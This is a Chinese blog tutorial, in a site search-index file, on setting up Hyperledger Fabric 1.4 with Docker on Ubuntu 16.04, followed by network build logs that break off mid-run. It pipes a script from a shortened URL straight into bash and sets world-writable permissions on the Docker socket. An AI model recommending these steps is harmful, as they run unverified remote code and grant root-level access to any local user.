<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Ubuntu 16.04 搭建hyperledger fabric 1.4</title>
      <link href="/2019/03/24/hyperledger/"/>
      <url>/2019/03/24/hyperledger/</url>
      
        <content type="html"><![CDATA[<h3 id="一、准备阶段"><a href="#一、准备阶段" class="headerlink" title="一、准备阶段"></a>一、准备阶段</h3><h4 id="1、系统软件源改为-aliyun"><a href="#1、系统软件源改为-aliyun" class="headerlink" title="1、系统软件源改为 aliyun"></a>1、系统软件源改为 aliyun</h4><p>步骤：setting -&gt; system settings -&gt; Software&amp;Updates -&gt; Download from -&gt; China -&gt; aliyun</p><p>结果如下：</p><p><img src="/2019/03/24/hyperledger/1.JPG" alt=""></p><h4 id="2、必备软件安装"><a href="#2、必备软件安装" class="headerlink" title="2、必备软件安装"></a>2、必备软件安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装vim          sudo apt-get install vim</span><br><span class="line">安装git          sudo apt-get install git</span><br><span class="line">安装curl         sudo apt-get install curl</span><br><span class="line">安装wget         sudo apt-get install wget</span><br></pre></td></tr></table></figure><h3 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h3><ul><li><p>安装go1.11 以及以上版本</p></li><li><p>安装docker 18.09.3-ce 以及以上版本</p></li><li><p>安装docker-compose 1.23.2 以及以上版本</p></li><li><p>git 拉下 fabric-sample 项目</p></li><li><p>下载docker image镜像</p><h4 id="1、go安装"><a href="#1、go安装" class="headerlink" title="1、go安装"></a>1、go安装</h4><p>下载并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~  </span><br><span class="line">wget https://studygolang.com/dl/golang/go1.11.linux-amd64.tar.gz    //下载</span><br><span class="line">tar -xzf go1.11.linux-amd64.tar.gz    //解压</span><br><span class="line">sudo mv go /usr/<span class="built_in">local</span>    //移动</span><br></pre></td></tr></table></figure><p>路径配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span>  PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin     //环境变量</span><br><span class="line"><span class="built_in">export</span>  GOROOT=/usr/<span class="built_in">local</span>/go             //安装根路径</span><br><span class="line"><span class="built_in">export</span>  GOPATH=<span class="variable">$HOME</span>/go                  //为后续安装fabric作准备</span><br><span class="line"><span class="built_in">export</span>  PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/go/bin          //环境变量</span><br></pre></td></tr></table></figure><p>创建go目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~   </span><br><span class="line">mkdir  -p  go/src/github.com/hyperledger/fabric //fabric安装目录</span><br><span class="line">sudo chmod -R 777 go</span><br></pre></td></tr></table></figure><h4 id="2、docker安装（使用docker仓库"><a href="#2、docker安装（使用docker仓库" class="headerlink" title="2、docker安装（使用docker仓库)"></a>2、docker安装（使用docker仓库)</h4><p>卸载旧版本docker，未安装docker可忽略此步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure><p>更新apt-get</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>下载安装工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>添加官方密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>将加入apt仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="variable">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">   stable"</span></span><br></pre></td></tr></table></figure><p>下载docker-ce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure><p>完成上面操作之后输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p>出现下面内容：</p><pre><code>Client: Version:           18.09.3 API version:       1.39 Go version:        go1.10.8 Git commit:        774a1f4 Built:             Thu Feb 28 06:40:58 2019 OS/Arch:           linux/amd64 Experimental:      falseGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.39/version: dial unix /var/run/docker.sock: connect: permission denied</code></pre><p>此时已经安装好Docker了，但是还需要一些小操作。因为普通用户没有权限 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker    创建docker组</span><br><span class="line">sudo usermod -aG docker XXX(XXX是当前用户名)</span><br></pre></td></tr></table></figure><p>下面添加阿里云的Docker镜像： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker     //创建docker目录</span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>将以下内容写入daemon.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://obou6wyb.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload </span><br><span class="line">sudo systemctl restart docker </span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><p>如果还有权限不足提示，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod -R 777 /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>正确的结果：</p><pre><code>Client: Version:           18.09.3 API version:       1.39 Go version:        go1.10.8 Git commit:        774a1f4 Built:             Thu Feb 28 06:40:58 2019 OS/Arch:           linux/amd64 Experimental:      falseServer: Docker Engine - Community Engine:  Version:          18.09.3  API version:      1.39 (minimum version 1.12)  Go version:       go1.10.8  Git commit:       774a1f4  Built:            Thu Feb 28 05:59:55 2019  OS/Arch:          linux/amd64  Experimental:     false</code></pre><p>到此docker安装完毕</p><h4 id="3、docker-compose安装"><a href="#3、docker-compose安装" class="headerlink" title="3、docker-compose安装"></a>3、docker-compose安装</h4><p>安装pip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip </span><br><span class="line">sudo pip install docker-compose</span><br></pre></td></tr></table></figure><p>查看docker-compose版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><p>出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose version 1.23.2, build 1110ad0</span><br></pre></td></tr></table></figure><p>安装成功！</p><h4 id="4、fabric-sample安装"><a href="#4、fabric-sample安装" class="headerlink" title="4、fabric-sample安装"></a>4、fabric-sample安装</h4><p>git下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> go/src/github.com/hyperledger/fabric/</span><br><span class="line">sudo git <span class="built_in">clone</span> https://github.com/hyperledger/fabric-samples.git</span><br><span class="line">sudo chmod -R 777 fabric-sample   //修改fabric-sample权限</span><br></pre></td></tr></table></figure><h4 id="5、下载docker镜像"><a href="#5、下载docker镜像" class="headerlink" title="5、下载docker镜像"></a>5、下载docker镜像</h4><p>进入fabric目录，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://bit.ly/2ysbOFE | bash -s -- 1.4.0</span><br></pre></td></tr></table></figure><p>下载等待时间稍久，完成后输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>出现以下镜像，则说明下载成功！</p><p><img src="/2019/03/24/hyperledger/2.JPG" alt=""></p><h3 id="三、构建第一个fabric网络"><a href="#三、构建第一个fabric网络" class="headerlink" title="三、构建第一个fabric网络"></a>三、构建第一个fabric网络</h3><h4 id="1、进入fabric-sample-first-network中"><a href="#1、进入fabric-sample-first-network中" class="headerlink" title="1、进入fabric-sample/first-network中"></a>1、进入fabric-sample/first-network中</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fabric-samples/first-network/</span><br></pre></td></tr></table></figure><h4 id="2、生成各种配置文件及工具"><a href="#2、生成各种配置文件及工具" class="headerlink" title="2、生成各种配置文件及工具"></a>2、生成各种配置文件及工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m generate -c mytest1   //mytest为channel名称</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">##########################################################</span><br><span class="line">##### Generate certificates using cryptogen tool #########</span><br><span class="line">##########################################################</span><br><span class="line">+ cryptogen generate --config=./crypto-config.yaml</span><br><span class="line">org1.example.com</span><br><span class="line">org2.example.com</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">/home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/../bin/configtxgen</span><br><span class="line">##########################################################</span><br><span class="line">#########  Generating Orderer Genesis block ##############</span><br><span class="line">##########################################################</span><br><span class="line">CONSENSUS_TYPE=solo</span><br><span class="line">+ &apos;[&apos; solo == solo &apos;]&apos;</span><br><span class="line">+ configtxgen -profile TwoOrgsOrdererGenesis -channelID byfn-sys-channel -outputBlock ./channel-artifacts/genesis.block</span><br><span class="line">2019-03-13 17:02:39.913 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.017 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 002 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.018 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 003 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.101 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 004 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.103 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 005 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.108 CST [common.tools.configtxgen] doOutputBlock -&gt; INFO 006 Generating genesis block</span><br><span class="line">2019-03-13 17:02:40.109 CST [common.tools.configtxgen] doOutputBlock -&gt; INFO 007 Writing genesis block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">### Generating channel configuration transaction &apos;channel.tx&apos; ###</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID mytest1</span><br><span class="line">2019-03-13 17:02:40.206 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.295 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.371 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.371 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.372 CST [common.tools.configtxgen] doOutputChannelCreateTx -&gt; INFO 005 Generating new channel configtx</span><br><span class="line">2019-03-13 17:02:40.391 CST [common.tools.configtxgen] doOutputChannelCreateTx -&gt; INFO 006 Writing new channel tx</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">#######    Generating anchor peer update for Org1MSP   ##########</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org1MSPanchors.tx -channelID mytest1 -asOrg Org1MSP</span><br><span class="line">2019-03-13 17:02:40.468 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.539 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 005 Generating anchor peer update</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 006 Writing anchor peer update</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">#######    Generating anchor peer update for Org2MSP   ##########</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org2MSPanchors.tx -channelID mytest1 -asOrg Org2MSP</span><br><span class="line">2019-03-13 17:02:40.696 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.773 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 005 Generating anchor peer update</span><br><span class="line">2019-03-13 17:02:40.847 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 006 Writing anchor peer update</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br></pre></td></tr></table></figure><h4 id="3、启动网络"><a href="#3、启动网络" class="headerlink" title="3、启动网络"></a>3、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m up -c mytest1</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">Creating network &quot;net_byfn&quot; with the default driver</span><br><span class="line">Creating volume &quot;net_peer0.org2.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer1.org2.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer1.org1.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer0.org1.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_orderer.example.com&quot; with default driver</span><br><span class="line">Creating peer1.org2.example.com ... done</span><br><span class="line">Creating peer0.org2.example.com ... done</span><br><span class="line">Creating peer1.org1.example.com ... done</span><br><span class="line">Creating peer0.org1.example.com ... done</span><br><span class="line">Creating orderer.example.com    ... done</span><br><span class="line">Creating cli                    ... done</span><br><span class="line"></span><br><span class="line"> ____    _____      _      ____    _____ </span><br><span class="line">/ ___|  |_   _|    / \    |  _ \  |_   _|</span><br><span class="line">\___ \    | |     / _ \   | |_) |   | |  </span><br><span class="line"> ___) |   | |    / ___ \  |  _ &lt;    | |  </span><br><span class="line">|____/    |_|   /_/   \_\ |_| \_\   |_|  </span><br><span class="line"></span><br><span class="line">Build your first network (BYFN) end-to-end test</span><br><span class="line"></span><br><span class="line">+ peer channel create -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/channel.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">Channel name : mytest1</span><br><span class="line">Creating channel...</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:35.602 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:35.801 UTC [cli.common] readBlock -&gt; INFO 002 Received block: 0</span><br><span class="line">===================== Channel &apos;mytest1&apos; created ===================== </span><br><span class="line"></span><br><span class="line">Having all peers join the channel...</span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:36.041 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:36.177 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer0.org1 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:39.396 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:39.473 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer1.org1 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:42.656 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:42.729 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer0.org2 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:45.890 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:45.990 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer1.org2 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Updating anchor peers for org1...</span><br><span class="line">+ peer channel update -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/Org1MSPanchors.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:49.159 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:49.208 UTC [channelCmd] update -&gt; INFO 002 Successfully submitted channel update</span><br><span class="line">===================== Anchor peers updated for org &apos;Org1MSP&apos; on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Updating anchor peers for org2...</span><br><span class="line">+ peer channel update -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/Org2MSPanchors.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:52.409 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:52.441 UTC [channelCmd] update -&gt; INFO 002 Successfully submitted channel update</span><br><span class="line">===================== Anchor peers updated for org &apos;Org2MSP&apos; on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Installing chaincode on peer0.org1...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:55.668 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:55.668 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:03:58.029 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer0.org1 ===================== </span><br><span class="line"></span><br><span class="line">Install chaincode on peer0.org2...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:58.241 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:58.241 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:03:58.597 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer0.org2 ===================== </span><br><span class="line"></span><br><span class="line">Instantiating chaincode on peer0.org2...</span><br><span class="line">+ peer chaincode instantiate -o orderer.example.com:7050 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem -C mytest1 -n mycc -l golang -v 1.0 -c &apos;&#123;&quot;Args&quot;:[&quot;init&quot;,&quot;a&quot;,&quot;100&quot;,&quot;b&quot;,&quot;200&quot;]&#125;&apos; -P &apos;AND (&apos;\&apos;&apos;Org1MSP.peer&apos;\&apos;&apos;,&apos;\&apos;&apos;Org2MSP.peer&apos;\&apos;&apos;)&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:58.812 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:58.812 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">===================== Chaincode is instantiated on peer0.org2 on channel 